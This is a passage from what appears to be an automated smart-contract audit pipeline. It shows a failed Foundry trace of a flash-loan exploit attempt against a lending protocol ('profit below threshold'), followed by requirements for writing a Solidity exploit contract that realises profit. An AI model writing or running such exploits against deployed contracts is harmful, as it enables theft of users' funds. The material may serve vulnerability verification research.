    │   ├─ [1825] 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C::assetStorage(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc) [staticcall]
    │   │   └─ ← [Return] AssetStorage({ collateralToken: 0xb02E552D68Cd538f571f72F630366adb616d9466, collateralOnlyToken: 0x22EE742A6773dF30C91b97c7dab590702046Ae95, debtToken: 0x809a14563A12acb8fc257502813131cA97E6CcF1, totalDeposits: 500000000000000000000000 [5e23], collateralOnlyDeposits: 0, totalBorrowAmount: 50000000000000000000000 [5e22] })
    │   ├─ [2559] 0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [371] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [414] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x809a14563A12acb8fc257502813131cA97E6CcF1.transfer
  at FlawVerifier.receiveFlashLoan
  at 0xBA12222222228d8Ba445958a75a0704d566BF2C8.flashLoan
  at FlawVerifier.attemptFlashDebtShareRoute
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 63.93s (57.44s CPU time)

Ran 1 test suite in 64.01s (63.93s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 27794752)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
